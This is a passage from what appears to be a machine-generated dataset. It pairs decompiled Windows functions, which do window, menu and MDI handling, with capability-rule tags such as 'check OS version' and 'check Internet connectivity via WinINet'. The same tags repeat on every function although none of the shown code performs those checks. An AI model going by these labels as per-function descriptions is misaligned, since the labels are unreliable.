        "decompiled_code": "\nchar __cdecl fcn.00474d7c(uint32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t *in_ECX;\n    uint32_t *in_EDX;\n    \n    *in_EDX = *in_EDX & 0x7f3bff7f;\n    *in_ECX = *in_ECX & 0xfffffe7e;\n    *arg_8h = *arg_8h & 0xffffd7ff;\n    cVar1 = *(in_EAX + 0x271);\n    if ((*(in_EAX + 0x277) == '\\x01') && ((cVar1 == '\\0' || (cVar1 == '\\x03')))) {\n        cVar1 = '\\x02';\n    }\n    // switch table (6 cases) at 0x474dca\n    switch(cVar1) {\n    case '\\0':\n        if ((*(in_EAX + 0x30) == 0) && (*(in_EAX + 0x1c4) == 0)) {\n            *in_EDX = *in_EDX | 0x80000000;\n        }\n        break;\n    case '\\x01':\n    case '\\x04':\n        *in_EDX = *in_EDX | 0xc00000;\n        break;\n    case '\\x02':\n    case '\\x05':\n        *in_EDX = *in_EDX | 0xc40000;\n        break;\n    case '\\x03':\n        if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n            *in_EDX = *in_EDX | 0x80c00000;\n        }\n        else {\n            *in_EDX = *in_EDX | 0xc00000;\n        }\n        *in_ECX = *in_ECX | 0x101;\n        if (**0x4a4dfc == '\\0') {\n            *in_EDX = *in_EDX | 0x400080;\n        }\n        *arg_8h = *arg_8h | 0x2808;\n    }\n    if ((cVar1 - 4U < 2) && (*(in_EAX + 0x277) != '\\x01')) {\n        *in_ECX = *in_ECX | 0x80;\n    }\n    return cVar1 + -6;\n}\n",
        "token_count": 548
    },
    "00474e90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00474e90(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    if (param_2 != *(in_EAX + 0x271)) {\n        *(in_EAX + 0x271) = param_2;\n        uStack24 = 0x474ece;\n        fcn.00472818();\n        uStack24 = 0x474ed5;\n        cVar1 = fcn.00466fb4();\n        if ((cVar1 != '\\0') && (((*(in_EAX + 7) & 0x10) == 0 || (((*(in_EAX + 7) & 0x10) != 0 && (in_EAX[0xc] != 0))))))\n        {\n            uStack24 = 0xfffffff0;\n            uStack28 = 0x474f00;\n            uStack28 = fcn.00466ca8();\n            uStack32 = 0x474f06;\n            uStack28 = sub.user32.dll_GetWindowLongA();\n            uStack32 = 0xffffffec;\n            uStack36 = 0x474f12;\n            uStack36 = fcn.00466ca8();\n            uStack32 = sub.user32.dll_GetWindowLongA();\n            uVar2 = fcn.00466ca8(0xffffffe6);\n            uStack36 = sub.user32.dll_GetClassLongA(uVar2);\n            puVar4 = &stack0xffffffdc;\n            fcn.0040483c(puVar4);\n            fcn.0040483c();\n            uVar3 = 0xfffffff0;\n            uVar2 = fcn.00466ca8(0xfffffff0, puVar4);\n            sub.user32.dll_SetWindowLongA(uVar2);\n            uVar2 = fcn.00466ca8(0xffffffec, uVar3);\n            sub.user32.dll_SetWindowLongA(uVar2);\n            uVar2 = fcn.00466ca8(0xffffffe6, uVar3);\n            sub.user32.dll_SetClassLongA(uVar2);\n            cVar1 = fcn.00466fb4();\n            if (cVar1 != '\\0') {\n                if (**0x4a4dfc != '\\0') {\n                    if (*(in_EAX + 0x271) == '\\x03') {\n                        uVar2 = fcn.00466ca8(0x80, 1, 0);\n                        sub.user32.dll_SendMessageA(uVar2);\n                    }\n                    else {\n                        uVar2 = fcn.00476d1c();\n                        uVar2 = fcn.00466ca8(0x80, 1, uVar2);\n                        sub.user32.dll_SendMessageA(uVar2);\n                    }\n                }\n                uVar2 = fcn.00466ca8(0xffffffff);\n                sub.user32.dll_GetSystemMenu(uVar2);\n                fcn.004601fc(0);\n            }\n            uVar2 = fcn.00466ca8(0, 0, 0, 0, 0, 0x37);\n            sub.user32.dll_SetWindowPos(uVar2);\n            (**(*in_EAX + 0x80))();\n        }\n    }\n    return;\n}\n",
        "token_count": 773
    },
    "004750cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004750cc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) {\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x29c), 0x229, 0, 0);\n        uVar1 = fcn.0045b9a4();\n    }\n    return uVar1;\n}\n",
        "token_count": 123
    },
    "00475100": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00475100(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) && (iVar1 = fcn.004799dc(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.004799c8();\n            if (*(iVar2 + 0x277) == '\\x01') {\n                iVar3 = iVar3 + 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return iVar3;\n}\n",
        "token_count": 179
    },
    "0047514c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0047514c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) && (iVar1 = fcn.004799dc(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.004799c8();\n            if ((*(iVar2 + 0x277) == '\\x01') && (param_2 = param_2 + -1,  param_2 < 0)) {\n                return iVar2;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 195
    },
    "004752b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004752b0(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x277)) {\n        if (((param_2 != '\\0') || (*(in_EAX + 0x277) != '\\x03')) && ((param_2 != '\\x03' || (*(in_EAX + 0x277) != '\\0')))\n           ) {\n            if ((param_2 == '\\x01') && (*(in_EAX + 0x9e) == '\\0')) {\n                puStack20 = 0x475365;\n                fcn.004757b8();\n            }\n            bVar3 = (*(in_EAX + 7) & 0x10) == 0;\n            if (bVar3) {\n                puStack20 = 0x475384;\n                fcn.00468048();\n            }\n            uStack24 = 0x475418;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            if (bVar3) {\n                puStack20 = &stack0xfffffffc;\n                (**(*in_EAX + 0xb0))();\n            }\n            cVar1 = *(in_EAX + 0x277);\n            *(in_EAX + 0x277) = param_2;\n            if (((param_2 == '\\x02') || (cVar1 == '\\x02')) && (*(in_EAX + 0x1d9) == '\\0')) {\n                fcn.004758f0();\n                fcn.0045f0b8();\n            }\n            if (bVar3) {\n                fcn.00463868();\n            }\n            if (param_2 == '\\x01') {\n                fcn.00473fe4();\n            }\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x47541f;\n            if (bVar3) {\n                uStack24 = 0x475417;\n                fcn.00468048();\n            }\n            return;\n        }\n        *(in_EAX + 0x277) = param_2;\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            puStack20 = 0x47530a;\n            cVar1 = fcn.00466fb4();\n            if (cVar1 != '\\0') {\n                puStack20 = 0x213;\n                uStack24 = 0;\n                uStack28 = 0;\n                uVar2 = fcn.00466ca8(*((*(in_EAX + 0x277) == '\\x03') * 4 + 0x4a4954), 0, 0);\n                sub.user32.dll_SetWindowPos(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 694
    },
    "00475424": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00475424(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if ((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) {\n        iVar3 = 0;\n        if (*(in_EAX + 0x290) != NULL) {\n            iVar3 = (**(**(in_EAX + 0x290) + 0x34))();\n        }\n        uVar4 = 0;\n        if (*(in_EAX + 0x2a0) != 0) {\n            uVar4 = fcn.0045487c();\n        }\n        uVar1 = fcn.00466ca8();\n        iVar2 = sub.user32.dll_GetMenu(uVar1);\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x29c), 0x230, iVar3, uVar4);\n        if (iVar3 != iVar2) {\n            uVar4 = fcn.00466ca8();\n            sub.user32.dll_DrawMenuBar(uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 271
    },
    "004754ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004754ec(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint arg_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    if ((param_2 != 0) && (iVar2 = fcn.004799dc(),  -1 < iVar2 + -1)) {\n        do {\n            var_4h = iVar2;\n            iVar2 = fcn.004799c8();\n            if ((param_2 == *(iVar2 + 0x290)) && (iVar2 = fcn.004799c8(),  in_EAX != iVar2)) {\n                var_ch = *(param_2 + 8);\n                var_8h._0_1_ = 0xb;\n                arg_ch = &var_ch;\n                arg_8h = 0;\n                fcn.00407480();\n                fcn.0040da34(arg_8h, arg_ch);\n                fcn.00404eb4();\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != 0);\n    }\n    if (*(in_EAX + 0x290) != 0) {\n        fcn.004580f0();\n    }\n    if (((*(in_EAX + 0x1c) & 8) != 0) || ((param_2 != 0 && ((*(param_2 + 0x1c) & 8) != 0)))) {\n        param_2 = 0;\n    }\n    *(in_EAX + 0x290) = param_2;\n    if ((param_2 == 0) || ((fcn.0041f744(),  (*(in_EAX + 0x1c) & 0x10) == 0 && (*(in_EAX + 0x271) == '\\x03')))) {\n        cVar1 = fcn.00466fb4();\n        if (cVar1 != '\\0') {\n            uVar4 = fcn.00466ca8(0);\n            sub.user32.dll_SetMenu(uVar4);\n        }\n    }\n    else if (((*(*(in_EAX + 0x290) + 0x5c) == '\\0') && (*(in_EAX + 0x277) != '\\x01')) ||\n            ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        cVar1 = fcn.00466fb4();\n        if (cVar1 != '\\0') {\n            iVar2 = (**(**(in_EAX + 0x290) + 0x34))();\n            arg_8h = fcn.00466ca8();\n            iVar3 = sub.user32.dll_GetMenu();\n            if (iVar2 != iVar3) {\n                (**(**(in_EAX + 0x290) + 0x34))();\n                arg_8h = fcn.00466ca8();\n                sub.user32.dll_SetMenu();\n            }\n            fcn.00466ca8();\n            fcn.004580f0();\n        }\n    }\n    else if ((*(in_EAX + 0x277) != '\\x01') && (cVar1 = fcn.00466fb4(),  cVar1 != '\\0')) {\n        uVar4 = fcn.00466ca8(0);\n        sub.user32.dll_SetMenu(uVar4);\n    }\n    if (*(in_EAX + 0x276) != '\\0') {\n        fcn.00476ba8();\n    }\n    fcn.00475424();\n    if (((*(in_EAX + 0x298) != 0) && ((*(in_EAX + 0x1c) & 0x10) != 0)) && (*(in_EAX + 0x30) != 0)) {\n        uVar4 = fcn.00466ca8(0, 0, 0, 0, 0, 0x37);\n        sub.user32.dll_SetWindowPos(uVar4);\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 1036
    },
    "00475728": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00475728(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x32c) == 0) {\n        uVar1 = fcn.00404610();\n        *(in_EAX + 0x32c) = uVar1;\n    }\n    return *(in_EAX + 0x32c);\n}\n",
        "token_count": 89
    },
    "00475750": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00475750(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x338) == 0) {\n        uVar1 = fcn.00404610();\n        *(in_EAX + 0x338) = uVar1;\n    }\n    return *(in_EAX + 0x338);\n}\n",
        "token_count": 86
    },
    "00475888": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00475888(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + 0x2a4) & 0xffffff00 | **(in_EAX + 0x2a4) != 0;\n}\n",
        "token_count": 60
    },
    "0047598c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047598c(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (((param_2 != *(in_EAX + 0x273)) && (*(in_EAX + 0x273) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) &&\n       (*(in_EAX + 0x1da) != '\\0')) {\n        uVar1 = fcn.00466ca8(*(param_2 * 4 + 0x4a495c));\n        sub.user32.dll_ShowWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "004759cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004759cc(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iStack20;\n    \n    if ((*(in_EAX + 0x279) != '\\0') && (*(*0x4ab078 + 0x44) != 0)) {\n        iVar10 = 0;\n        if (*(in_EAX + 0x279) == '\\x02') {\n            iVar10 = fcn.004751cc();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if ((*(in_EAX + 0x279) == '\\x03') && (*(*0x4ab07c + 0x68) != 0)) {\n            iVar10 = fcn.004751cc();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if (*(in_EAX + 0x279) == '\\x01') {\n            iVar10 = fcn.0047a8a8();\n            iVar10 = *(iVar10 + 4);\n        }\n        iVar1 = fcn.004751cc();\n        iVar1 = *(iVar1 + 4);\n        iStack20 = fcn.004799ac();\n        if (-1 < iStack20 + -1) {\n            do {\n                iVar2 = fcn.00479998();\n                if (((*(iVar2 + 4) == iVar10) && (iVar10 != iVar1)) && (iVar2 = fcn.004799ac(),  -1 < iVar2 + -1)) {\n                    iVar11 = 0;\n                    do {\n                        iVar3 = fcn.00479998(iVar10, iVar1, iVar11);\n                        if (*(iVar3 + 4) == iVar1) {\n                            if (*(in_EAX + 0x9e) == '\\x04') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.00479998(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.00479678();\n                                fcn.00479998(iVar4);\n                                iVar5 = fcn.0047965c();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.00479998(iVar4 + iVar3);\n                                fcn.00479644();\n                                fcn.00479998();\n                                fcn.00479690();\n                                (**(*in_EAX + 0x88))();\n                            }\n                            else if (*(in_EAX + 0x9e) == '\\x06') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.00479998(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.00479678();\n                                fcn.00479998(iVar4);\n                                iVar5 = fcn.0047965c();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.00479998(iVar4 + iVar3);\n                                fcn.00479644();\n                                fcn.00479998();\n                                fcn.00479690();\n                                (**(*in_EAX + 0x88))();\n                            }\n                            else {\n                                fcn.00479998(iVar10, iVar1, iVar11);\n                                iVar3 = fcn.00479644();\n                                iVar4 = fcn.00473b74();\n                                fcn.00479998();\n                                iVar5 = fcn.00479644();\n                                fcn.00479998();\n                                iVar7 = fcn.00479644();\n                                fcn.00479998();\n                                iVar8 = fcn.00479690();\n                                if (iVar7 + iVar8 < in_EAX[0x12] + ((iVar3 + iVar4) - iVar5)) {\n                                    fcn.00479998();\n                                    fcn.00479644();\n                                    fcn.00479998();\n                                    fcn.00479690();\n                                }\n                                fcn.00479998();\n                                iVar3 = fcn.00479678();\n                                iVar4 = fcn.00473b94();\n                                iVar3 = iVar3 + iVar4;\n                                fcn.00479998();\n                                iVar4 = fcn.00479678();\n                                fcn.00479998();\n                                iVar5 = fcn.00479678();\n                                fcn.00479998();\n                                iVar7 = fcn.0047965c();\n                                if (iVar5 + iVar7 < (iVar3 - iVar4) + in_EAX[0x13]) {\n                                    fcn.00479998();\n                                    uVar9 = fcn.00479678();\n                                    fcn.00479998(uVar9);\n                                    fcn.0047965c();\n                                }\n                                (**(*in_EAX + 0x88))(in_EAX[0x13], in_EAX[0x12]);\n                            }\n                        }\n                        iVar11 = iVar11 + 1;\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n                iStack20 = iStack20 + -1;\n            } while (iStack20 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 1257
    },
    "00476380": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476380(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *extraout_EDX;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff20;\n    uint uStack208;\n    uint uStack204;\n    uchar *puStack200;\n    uint var_b4h;\n    uint var_b0h;\n    uint32_t var_a8h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack200 = &stack0xfffffffc;\n    uStack204 = 0x4764a9;\n    uStack208 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack208;\n    if ((*(in_EAX + 0x277) == '\\x01') && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n        if ((*(*0x4ab078 + 0x44) == 0) || (puStack200 = &stack0xfffffffc,  *(*(*0x4ab078 + 0x44) + 0x29c) == 0)) {\n            puStack200 = &stack0xfffffffc;\n            fcn.00407480();\n            fcn.0040d9f8();\n            fcn.00404eb4();\n            param_2 = extraout_EDX;\n        }\n        var_24h = param_2 + 0x13;\n        var_20h = *param_2;\n        var_1ch = *0x4a87f8;\n        var_18h = param_2[3];\n        var_14h = param_2[4];\n        var_10h = param_2[5];\n        var_ch = param_2[6];\n        var_8h = param_2[1];\n        var_4h = param_2[8];\n        in_stack_ffffff20 = *(*(*0x4ab078 + 0x44) + 0x29c);\n        uVar1 = sub.user32.dll_SendMessageA(in_stack_ffffff20, 0x220, 0, &var_24h);\n        *(in_EAX + 0x1b4) = uVar1;\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) | 0x10;\n    }\n    else {\n        puVar3 = &var_b0h;\n        for (iVar2 = 0x23; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_a8h = var_a8h & 0xfff7ffff;\n        fcn.004631b4();\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) & 0xef;\n    }\n    fcn.00479008();\n    *in_FS_OFFSET = in_stack_ffffff20;\n    fcn.0040546c(0x4764b0);\n    return;\n}\n",
        "token_count": 764
    },
    "004764fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004764fc(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    code *pcStack32;\n    uint *puStack28;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x1b4) != 0) {\n        if ((*(in_EAX + 0x32c) != 0) && (var_14h = *(*(in_EAX + 0x32c) + 8),  -1 < var_14h + -1)) {\n            var_8h = 0;\n            var_4h = in_EAX;\n            if ((*(in_EAX + 0x55) & 0x20) != 0) {\n                puStack28 = 0x476557;\n                fcn.00419610();\n                puStack28 = 0x47655e;\n                fcn.00468048();\n            }\n            pcStack32 = 0x4765b4;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            puStack28 = &stack0xfffffffc;\n            piVar1 = fcn.00419610();\n            (**(*piVar1 + 0xb0))();\n            *in_FS_OFFSET = uStack36;\n            puStack28 = 0x4765bb;\n            if ((*(var_4h + 0x55) & 0x20) != 0) {\n                pcStack32 = 0x4765ac;\n                fcn.00419610();\n                pcStack32 = 0x4765b3;\n                fcn.00468048();\n            }\n            return;\n        }\n        var_10h = *(in_EAX + 0x1b4);\n        var_ch._0_1_ = (*(in_EAX + 0x55) & 0x20) != 0;\n        puStack28 = &fcn.004764fc::var_10h;\n        pcStack32 = fcn.004764b8;\n        uStack36 = 0x4765ee;\n        uStack36 = sub.kernel32.dll_GetCurrentThreadId_1();\n        sub.user32.dll_EnumThreadWindows();\n    }\n    fcn.0046362c();\n    return;\n}\n",
        "token_count": 555
    },
    "004767d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004767d4(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar4;\n    uint var_4h;\n    \n    *0x4a48f4 = *0x4a48f4 + 1;\n    if (*(in_EAX + 0x298) == 0) {\n        if (in_EAX == param_2) {\n            *(in_EAX + 0x268) = 0;\n        }\n        else {\n            *(in_EAX + 0x268) = param_2;\n        }\n    }\n    *(*0x4ab07c + 100) = param_2;\n    *(*0x4ab07c + 0x68) = in_EAX;\n    fcn.00419754();\n    fcn.0041968c();\n    cVar2 = fcn.004047cc();\n    if (cVar2 == '\\0') {\n        *(*0x4ab07c + 0x6c) = 0;\n    }\n    else {\n        *(*0x4ab07c + 0x6c) = in_EAX;\n        fcn.00419754();\n        fcn.0041968c();\n    }\n    if ((*(param_2 + 0x54) & 0x20) != 0) {\n        return 0;\n    }\n    *(param_2 + 0x54) = *(param_2 + 0x54) | *0x476a74;\n    iVar4 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (in_EAX != *(*0x4ab07c + 0x78)) {\n        if (*(*0x4ab07c + 0x78) != 0) {\n            fcn.00466ca8();\n            *(*0x4ab07c + 0x78) = 0;\n            cVar2 = fcn.00471694();\n            if (cVar2 == '\\0') {\n                fcn.00404f60();\n                return 0;\n            }\n        }\n        *(*0x4ab07c + 0x78) = in_EAX;\n        fcn.00466ca8();\n        cVar2 = fcn.00471694();\n        if (cVar2 == '\\0') {\n            fcn.00404f60();\n            return 0;\n        }\n    }\n    if (*(in_EAX + 0x26c) == 0) {\n        *(in_EAX + 0x26c) = in_EAX;\n    }\n    if (*(in_EAX + 0x26c) != param_2) {\n        while ((*(in_EAX + 0x26c) != 0 && (cVar2 = fcn.00462b00(),  cVar2 == '\\0'))) {\n            fcn.00466ca8();\n            *(in_EAX + 0x26c) = *(*(in_EAX + 0x26c) + 0x30);\n            cVar2 = fcn.00471694();\n            if (cVar2 == '\\0') {\n                fcn.00404f60();\n                return 0;\n            }\n        }\n        while (iVar4 = param_2,  *(in_EAX + 0x26c) != param_2) {\n            do {\n                iVar3 = iVar4;\n                iVar4 = *(iVar3 + 0x30);\n            } while (iVar4 != *(in_EAX + 0x26c));\n            *(in_EAX + 0x26c) = iVar3;\n            fcn.00466ca8();\n            cVar2 = fcn.00471694();\n            if (cVar2 == '\\0') {\n                fcn.00404f60();\n                return 0;\n            }\n        }\n        piVar1 = *(param_2 + 0x30);\n        if ((*(param_2 + 0x1c) & 0x10) == 0) {\n            for (; piVar1 != NULL; piVar1 = piVar1[0xc]) {\n                cVar2 = fcn.004047cc();\n                if (cVar2 != '\\0') {\n                    (**(*piVar1 + 0xdc))();\n                }\n            }\n        }\n        fcn.004601fc(param_2);\n        if ((*(in_EAX + 0x2c4) != 0) && (*(in_EAX + 0x2c4) != param_2)) {\n            iVar4 = 0;\n            fcn.004601fc(0);\n        }\n    }\n    *in_FS_OFFSET = iVar4;\n    *(param_2 + 0x54) = ~*0x476a74 & *(param_2 + 0x54);\n    return param_2;\n}\n",
        "token_count": 1101
    },
    "00476a7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
